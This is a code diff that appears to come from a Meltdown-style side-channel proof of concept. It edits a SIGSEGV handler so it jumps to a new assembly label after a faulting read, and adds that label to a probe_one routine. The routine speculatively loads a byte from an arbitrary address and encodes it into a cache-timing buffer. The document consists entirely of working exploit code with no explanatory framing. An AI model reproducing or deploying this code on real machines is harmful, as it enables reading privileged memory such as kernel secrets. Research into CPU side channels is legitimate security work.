@@ -83,7 +83,6 @@ static __rtm_force_inline int _xtest(void)
 #endif
 #else
 
-
 #include <signal.h>
 
 #ifdef __APPLE__
@@ -96,6 +95,8 @@ static __rtm_force_inline int _xtest(void)
 
 #endif
 
+extern char __speculative_byte_load_exit[];
+
 static void sigaction_segv(int signal, siginfo_t *si, void *arg)
 {
     ucontext_t *ctx = (ucontext_t *)arg;
@@ -105,7 +106,7 @@ static void sigaction_segv(int signal, siginfo_t *si, void *arg)
        So we skip the offender ! */
     #ifdef __x86_64__
         //fprintf(stderr, "Caught SIGSEGV, addr %p, RIP 0x%llx\n", si->si_addr, RIP);
-        RIP += 6; //skip sigsev to next instruction
+        RIP = (uintptr_t)__speculative_byte_load_exit; //skip sigsegv to next instruction
     #else
         #error fix dat for x86
         printf("Caught SIGSEGV, addr %p, EIP 0x%x\n", si->si_addr, ctx->uc_mcontext.gregs[REG_EIP]);
@@ -172,12 +173,15 @@ unsigned char probe_one(size_t ptr, char* buf, int page_size)
       if ((status = _xbegin()) == _XBEGIN_STARTED) {
 #endif
          asm __volatile__ (
+           ".global __speculative_byte_load_exit \n\t"
            "%=:                              \n"
            "xorq %%rax, %%rax                \n"
            "movb (%[ptr]), %%al              \n"
            "shlq $0xc, %%rax                 \n"
            "jz %=b                           \n"
            "movq (%[buf], %%rax, 1), %%rbx   \n"
+           "__speculative_byte_load_exit:     \n"
+           "nop                               \n"
            : 
            :  [ptr] "r" (ptr), [buf] "r" (buf)
            :  "%rax", "%rbx");
